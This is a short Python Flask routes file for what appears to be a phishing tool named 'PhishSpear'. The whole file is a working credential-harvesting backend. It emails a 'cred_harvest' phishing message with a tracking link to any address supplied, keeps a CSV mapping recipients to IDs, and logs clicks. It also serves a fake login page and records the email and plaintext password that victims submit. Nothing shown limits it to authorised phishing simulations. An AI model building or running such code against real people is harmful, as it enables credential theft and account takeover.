""" Handle web routes for the application (URLs)"""

from flask import Blueprint, request, render_template
from app.utils import send_phishing_email, log_interaction, generate_uid
from urllib.parse import quote, unquote
import csv

main = Blueprint('main', __name__)

@main.route('/')
def index():
    return "PhishSpear Backend Running!"

@main.route('/send_email')
def send_email():
    to_email = request.args.get('to') # Get the recipient email from query parameters
    if not to_email:
        return "Please specify ?to=email@example.com", 400

    uid = generate_uid()  # Generate a unique ID for the user

    with open("campaigns/logs/uid_map.csv", "a", newline='') as f:
        writer = csv.writer(f)
        writer.writerow([uid, to_email])

    tracking_url = f"http://localhost:5000/login?uid={uid}"
    send_phishing_email(to_email, 'cred_harvest', tracking_url)

    return f"Email sent to {to_email} with tracking link: {tracking_url}"

@main.route('/login', methods=['GET', 'POST'])
def phishing_login():
    uid = request.args.get('uid') or request.form.get('uid')
    uid = unquote(uid) if uid else None # Decode the uid if it was encoded

    if request.method == 'GET':
        if uid:
            log_interaction(uid, action="clicked")  # Log the click
        return render_template('phishing_login.html', uid=uid)

    # If POST: credentials submitted
    email = request.form.get('email')
    password = request.form.get('password')
    log_interaction(uid, email=email, password=password, action="submitted")

    return "Thank you for verifying. You may close this tab."

"""
Defines the / route. When you visit http://localhost:5000, you will see this message.

We use a Blueprint, which is Flasks way of organizing routes cleanly when the app gets bigger.
"""